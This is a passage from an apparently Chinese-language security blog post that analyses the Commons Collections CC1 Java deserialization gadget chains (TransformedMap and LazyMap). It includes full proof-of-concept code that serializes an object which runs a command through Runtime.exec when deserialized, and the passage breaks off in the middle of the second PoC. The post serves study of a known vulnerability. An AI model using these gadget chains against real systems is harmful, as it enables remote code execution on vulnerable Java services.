<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span><br><span class="line">        //第一个参数Map对象</span><br><span class="line">        Map map=new HashMap();</span><br><span class="line">        map.put(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">        //第二个参数和第三个参数类型一致，且有一个即可调用，传入InvokerTransformer对象</span><br><span class="line">        InvokerTransformer iv=new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;);</span><br><span class="line">        //调用decorate实现实例化对象并调用构造函数传参,Map类型必须为&lt;Object,Object&gt;，否则for循环调用tm对象会导致参数类型不一致会报错</span><br><span class="line">        Map&lt;Object,Object&gt; tm= TransformedMap.decorate(map,null,iv);</span><br><span class="line"></span><br><span class="line">        for( Map.Entry entry: tm.entrySet()) &#123;</span><br><span class="line">            //调用setValue，传递Runtime对象</span><br><span class="line">            entry.setValue(Runtime.getRuntime()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-25.png" title="实现调用"></p>
<p>现在发现父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，下一个思路就是找到实现序列化接口并且能调用<code>setValue()</code>方法的<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-26.png" title="setValue()调用"><br>找到42个方法，其中<code>AnnotationInvocationHandler</code>类实现了序列化接口，同时重写了<code>readObject</code>方法，并且<code>setValue()</code>在重写的<code>readObject</code>方法中进行调用<br>其中构造函数获取两个参数，一个class类型<code>Class type</code>,一个Map类型<code>Map memberValues</code>，然后进行了type的类型判断，最后返回给变量<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-28.png" title="AbstractInputCheckedMapDecorator类"><br>序列化前半段也是通过<code>getInstance</code>方法对type类型进行判断,判断type的类型是否为注解类的方法类型名，是的话便通过<code>memberTypes()</code>方法获取其成员方法名和返回方法，存在Map类型的<code>memberTypes</code>对象中<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-27.png" title="重写序列化方法"><br>后半段也是最主要的for循环部分，遍历<code>memberValues</code>也就是构造方法传入的第二个参数（传入TransformedMap[]数组），循环获取键名，通过<code>memberTypes.get(name)</code>判断键名是否是注解类（Annotation类，全名java.lang.annotation.Annotation）的方法类型名，如果是的话就获取键值给<code>value</code>变量，<strong>这里通过键名设置注解类（Annotation类）的实例方法名即可通过条件判断</strong>。<br>接下来继续判断<code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)</code>意思判断value的值如果不是注解类的方法或者键名的值是ExceptionProxy的实例，则通过<code>memberValue.setValue</code>方法修改该键名的值，<strong>这里只用键值不是注解类（Annotation类）的实例方法名即可满足条件判断</strong>，然后调用<code>memberValue.setValue</code>方法达到目的<br>可以找到注解类Annotation的实现方法（找到引用的java.lang.annotation.Annotation，Ctrl+Alt+鼠标左键点击Annotation即可找到对应的实现方法），找到其中对应有成员的任意方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-31.png" title="实现方法"><br>比如Generated注释类，可以put value方法名。（实际测试过程中找到的实现方法有大部分还是不能触发，只有部分类和方法才行）<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-32.png" title="Generated类"></p>
<p>现在利用链就完整了，入口点为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法，一直到最后调用<code>InvokerTransformer.transform(Object)</code>方法</p>
<h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>TransformedMap CC1链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                TransformedMap.entrySet()</span><br><span class="line">                    AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                        TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
<p>其中通过上述学习还没涉及到<code>ChainedTransformer.transform()</code>这个环节的利用方法，在构造Poc中可以学习下利用方法和原理</p>
<h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>理思路<br>1、入口点在为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法中调用<code>setValue()</code>方法，但<code>AnnotationInvocationHandler</code>这个类未声明Public，只有通过反射进行调用。<br>通过反射调用<code>AnnotationInvocationHandler</code>类对象，并且调用构造方法，然后通过实例化向构造方法传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//获取AnnotationInvocationHandler类对象</span><br><span class="line">        Class cla=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span><br><span class="line">        Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        //传入参数用a,b代替表示</span><br><span class="line">        Object obj=cons.newInstance(a,b);</span><br></pre></td></tr></table></figure>
<p>2、接下来久要对传参内容进行确定，传入什么，其中a为Class类对象，b为Map对象，通过反序列化调用，从利用链的分析知道a传入的为注解类<code>Annotation</code>类，可以找到的<code>Generated</code>类的<code>value</code>名称，同时建立<code>HashMap</code>，并put键名为<code>value</code>，键值为任意即可绕过for循环的判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map map = new HashMap();</span><br><span class="line">map.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">Object obj=cons.newInstance(Generated.class,b);</span><br></pre></td></tr></table></figure>
<p>b为Map对象，并且该参数会执行调用到<code>AnnotationInvocationHandler</code>类<code>readObject</code>方法中的<code>AbstractMapEntryDecorator.MapEntry.setValue()</code>，从而在<code>setValue()</code>方法中调用到<code>TransformedMap.checkSetValue()</code>方法，最后返回调用到<code>TransformedMap</code>中<code>valueTransformer.transform()</code>方法，<code>valueTransformer</code>为<code>TransformedMap</code>构造函数的第三个参数即传入<code>InvokerTransformer</code>类对象，<code>Runtime</code>对象作为<code>transform(Object)</code>参数传入的值<br>但由于Runtime对象未实现序列化接口，无法序列化，并且<code>valueTransformer.transform(Object)</code>中的Object实际并不可控设置为Runtime对象值。因此利用到了<code>ChainedTransformer</code>类，也是上文学习中未提及实际利用方法的类，该类传入Transformer数组，并由transform方法实现循环调用。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-34.png" title="ChainedTransformer类"><br>因为<code>Runtime</code>类未实现序列化接口，只有通过反射实现对它的调用，即<code>Runtime.class</code>，再由于这个循环会有一个初识的transform(Object)，其中的Object在第一次循环的时候是由调用<code>ChainedTransformer.transform(Object)</code>传入的（传入的重写的反序列化方法中setValue()中的值），并没有实际传入的类对象。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-35.png" title="初始的Object值"><br>此时通过调用<code>ConstantTransformer</code>类来解决这个问题，一来可以通过它来实现返回<code>Runtime.class</code>对象，二来通过把他设置为<code>TransformedMap</code>数组的首位来规避初始调用的<code>Object</code>的问题，因为<code>ConstantTransformer</code>的<code>transform(Object)</code>不管输入什么都返回构造方法中的对象，然后再通过反射构建<code>Runtime</code>对象并调用<code>exec</code>方法，最后执行命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
<p>在理解<code>ConstantTransformer</code>的<code>transform(Object)</code>方法的实际原理时也挺绕，可以试着把上面的执行效果带入到该方法中，能更好的理解如何实现最后调用到<code>InvokerTransformer</code>方法并传入<code>Runtime</code>对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-33.png" title="transform方法"><br>通过一次一次循环把对应<code>Object</code>输出到下次作为输入就能理解怎么实现的了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">object = new ConstantTransformer(Runtime.class).transform(123); </span><br><span class="line">//= Runtime.class transform中输入任何数字都返回Runtime对象，但还没实例化</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;).transform(Runtime.class) </span><br><span class="line">//=Runtime.class.getRuntime()  调用Runtime对象的getRuntime() 但该方法还没执行，只是获取了该方法</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;).transform(Runtime.class.getRuntime()) </span><br><span class="line">//=Runtime.class.getRuntime()  执行Runtime.getRuntime() 此时正式实例化了Runtime对象</span><br><span class="line"></span><br><span class="line">Object = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(Runtime.class.getRuntime().invoke())</span><br><span class="line">//=Runtime.class.getRuntime().exec(&quot;calc&quot;) 执行Runtime.exec()方法</span><br></pre></td></tr></table></figure>

<p>3、在实现了2步骤的一长段的利用链的相关调用，最后就是传递的b就是<code>Transformer transformerChain = new ChainedTransformer(transformers);</code>中的<code>transformerChain</code>数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//获取AnnotationInvocationHandler类对象</span><br><span class="line">        Class cla=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span><br><span class="line">        Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        //传入参数用a,b代替表示</span><br><span class="line">        Object obj=cons.newInstance(Generated.class,transformerChain);</span><br></pre></td></tr></table></figure>

<p>4、最后就是序列化该<code>AnnotationInvocationHandler</code>对象，反序列化时触发漏洞，得到最终POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map tmap = TransformedMap.decorate(map, null, transformerChain);</span><br><span class="line">        //反射获取AnnotationInvocationHandler的对象传入tmap</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object obj = declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        //序列化写入文件</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;result.ser&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        //反序列化触发漏洞</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;result.ser&quot;));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>接下来是LazyMap链，CC1的另一条链，也是ysoserial中利用CC1的链。在分析<code>InvokerTransformer</code>类时说到该类为最终的执行类，找到调用<code>InvokerTransformer.transform(Object)</code>方法的类，其中有上文分析的TransformedMap类，还有个就是LazyMap类<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-36.png" title="调用transform方法的类"><br>该类通过构造方法传入对象并赋值给<code>factory</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-38.png" title="构造方法"><br>调用了<code>transform()</code>方法的<code>get</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-37.png" title="get方法"><br><code>get</code>方法中会判断参数<code>key</code>是否为<code>HashMap</code>中<code>Map</code>的内容，如果不是<code>Map</code>中的内容，就创建一个<code>value</code>作为<code>key</code>的值放入<code>Map</code>中，给value赋值时调用了<code>transform()</code>方法。<br>该<code>get()</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用，通过构造方法传入<code>LazyMap</code>对象然后在<code>invoke</code>方法中调用到<code>LazyMap.get()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-39.png" title="invoke方法"><br>invoke方法的调用并不在该类重写的<code>readObject</code>方法中，因此入口点就有点变化，<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>动态类，这里调用<code>invoke</code>方法就涉及到<strong>动态代理</strong><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-40.png" title="InvocationHandler"><br>动态代理<code>InvocationHandler</code>：</p>
<blockquote>
<p>每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用</p>
</blockquote>
<p>实现方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[接口类] proxyMap=(接口类)Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span><br></pre></td></tr></table></figure>
<p>例如使用Map对象进行动态代理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure>
<p>其中涉及到<code>Proxy</code>代理类，并通过<code>newProxyInstance()</code>实现动态代理。<br><code>newProxyInstance</code>类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh);</span><br></pre></td></tr></table></figure>
<p>三个参数分别表示:目标对象所属类的加载器、目标对象实现的接口数组、调用接口时触发的对应方法</p>
<p>实现demo:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Proxydemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        class demo implements InvocationHandler&#123;</span><br><span class="line">            private Map map;</span><br><span class="line"></span><br><span class="line">            public demo(Map map)&#123;</span><br><span class="line">                this.map=map;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                System.out.println(&quot;调用了invoke方法&quot;);</span><br><span class="line">                if(method.getName().equals(&quot;put&quot;))&#123;</span><br><span class="line">                    System.out.println(&quot;调用了put方法&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        InvocationHandler in=new demo(new HashMap());</span><br><span class="line">        Map map=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,in);</span><br><span class="line">        map.put(&quot;11&quot;,&quot;11&quot;);</span><br><span class="line">        map.put(&quot;22&quot;,&quot;22&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">![](cc1-41.png &quot;InvocationHandler&quot;)</span><br></pre></td></tr></table></figure>
<p>可以看到map对象每执行一次方法，便会调用执行一次invoke方法，invoke方法也可以起拦截器的作用。</p>
<p>简单了解了动态代理的用法，接下来回到LazyMap类的调用<br><code>LazyMap</code>的<code>get</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用<br>因此入口点就在实现动态类调用到LazyMap的invoke方法。</p>
<h3 id="完整利用链-1"><a href="#完整利用链-1" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>LazyMap CC1链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h3 id="构造POC-1"><a href="#构造POC-1" class="headerlink" title="构造POC"></a>构造POC</h3><p>POC的前半段依旧采用TransformedMap利用链的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br></pre></td></tr></table></figure>
<p>将传参入口变更至LazyMap类中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map Lmap = LazyMap.decorate(map, transformerChain);</span><br></pre></td></tr></table></figure>
<p>同<code>TransformedMap</code>利用链一样通过反射调用<code>AnnotationInvocationHandler</code>类，然后调用InvocationHandler代理调用<code>AnnotationInvocationHandler</code>类的构造函数传入参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br></pre></td></tr></table></figure>
<p>然后创建<code>proxy</code>代理对象，参数分别为<code>Map加载器</code>、<code>Map类数组</code>、<code>InvocationHandler对象invohandler</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br></pre></td></tr></table></figure>
<p>再通过代理调用代理对象，执行<code>AnnotationInvocationHandler.invoke</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure>
<p>最后就是对<code>InvocationHandler</code>对象进行序列化，再反序列化触发漏洞</p>
<p>得到最终POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //获取Runtime类对象</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                //反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new 